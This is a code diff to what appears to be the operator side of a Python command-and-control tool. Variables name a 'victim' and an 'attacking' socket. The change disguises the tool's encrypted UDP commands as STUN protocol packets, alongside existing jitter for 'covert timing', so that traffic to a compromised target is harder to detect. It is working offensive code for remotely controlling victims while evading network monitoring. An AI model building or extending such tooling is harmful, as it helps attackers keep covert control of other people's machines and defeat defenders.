@@ -1,8 +1,9 @@
-import rsa, socket, random, time, sys, threading, argparse, base64
+import rsa, socket, random, time, sys, threading, argparse, base64, struct
 from decryption import decrypt_message
 from encryption import encrypt_message
 from message_fragmentation import fragment_message
 from port import get_available_port
+from stun import build_stun_message
 from prompt_toolkit import prompt
 from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.patch_stdout import patch_stdout
@@ -64,7 +65,7 @@ def exchange_keys():
         log_error("<ansimagenta>Encryption keys was not exchanged, started exchanging now.</ansimagenta>")
     else:
         log_info("<ansimagenta>Generating a new RSA keys, exchanging keys now.</ansimagenta>")
-    exchange_sock.sendto("gen_key".encode('utf8'), (target_ip, target_port))
+    exchange_sock.sendto(build_stun_message("gen_key"), (target_ip, target_port))
     exchange_sock.close()
     get_response(listening_port)
     return
@@ -90,6 +91,19 @@ def get_response(port):
     try:
         while True:
             data, addr = listen_socket.recvfrom(2048)
+            if len(data) < 20:
+                continue
+            header = data[:20]
+            attributes = data[20:]
+            if len(attributes) < 4:
+                continue
+            msg_type, msg_length = struct.unpack('!HH', header[:4])
+            magic_cookie = struct.unpack('!I', header[4:8])[0]
+            if magic_cookie != 0x2112A442:
+                continue
+            attr_type, attr_length = struct.unpack('!HH', attributes[:4])
+            data = attributes[4:4+attr_length]
+
             victim_ip, victim_port = addr
             part, total, index = data.decode('utf8').split('|', 2)
             total = int(total)
@@ -119,7 +133,7 @@ def get_response(port):
             if part.startswith("PublicKey("):
                 target_pub_key = parse_public_key(part)
                 ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
-                listen_socket.sendto(f"PublicKey({my_pub_key.n}, {my_pub_key.e})".encode('utf8'), (target_ip, target_port))
+                listen_socket.sendto(build_stun_message(f"PublicKey({my_pub_key.n}, {my_pub_key.e})".encode('utf8')), (target_ip, target_port))
                 log_success("<ansiblue>Successfully exchanged keys, you can now send commands securely.</ansiblue>")
                 listen_socket.close()
                 log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
@@ -158,36 +172,40 @@ def get_response(port):
 
 # Encrypts and sends a command to the target, fragmenting as needed
 def send_command(message, listening_port):
-    global my_priv_key, delay, jitter, target_ip, target_port, my_pub_key, target_pub_key
-    attacking_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        try:
-            attacking_sock.bind(("0.0.0.0", listening_port))
-            break
-        except:
-            continue
+    try:
+        global my_priv_key, delay, jitter, target_ip, target_port, my_pub_key, target_pub_key
+        attacking_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while True:
+            try:
+                attacking_sock.bind(("0.0.0.0", listening_port))
+                break
+            except:
+                continue
 
-    # Ensure key exchange has occurred
-    if target_pub_key == None:
-        exchange_keys()
-    
-    # Combine AES-encrypted message and RSA-encrypted AES key, then base64 encode
-    encrypted_message = encrypt_message(message, target_pub_key)
+        # Ensure key exchange has occurred
+        if target_pub_key == None:
+            exchange_keys()
+        
+        # Combine AES-encrypted message and RSA-encrypted AES key, then base64 encode
+        encrypted_message = encrypt_message(message, target_pub_key)
 
-    if encrypted_message["status"] == 200:
-        encrypted_message = encrypted_message["message"].encode('utf8')
-    else:
-        log_error("<ansired>Failed to provide an encrypted connection, message was not sent.</ansired>")
-        return
-    encrypted_message = base64.b64encode(encrypted_message).decode('utf8')
-    chunks = fragment_message(encrypted_message, listening_port, chunk_size)
-    for chunk in chunks:
-        attacking_sock.sendto(chunk, (target_ip, target_port))
-        # Add jitter to delay for covert timing
-        jitter_delay = delay + random.uniform(-jitter, jitter)
-        jitter_delay = max(0, jitter_delay)
-        time.sleep(jitter_delay)
-    attacking_sock.close()
+        if encrypted_message["status"] == 200:
+            encrypted_message = encrypted_message["message"].encode('utf8')
+        else:
+            log_error("<ansired>Failed to provide an encrypted connection, message was not sent.</ansired>")
+            return
+        encrypted_message = base64.b64encode(encrypted_message).decode('utf8')
+        chunks = fragment_message(encrypted_message, listening_port, chunk_size)
+        for chunk in chunks:
+            chunk = build_stun_message(chunk)
+            attacking_sock.sendto(chunk, (target_ip, target_port))
+            # Add jitter to delay for covert timing
+            jitter_delay = delay + random.uniform(-jitter, jitter)
+            jitter_delay = max(0, jitter_delay)
+            time.sleep(jitter_delay)
+        attacking_sock.close()
+    except Exception as e:
+        print(e)
         
 
 def main():
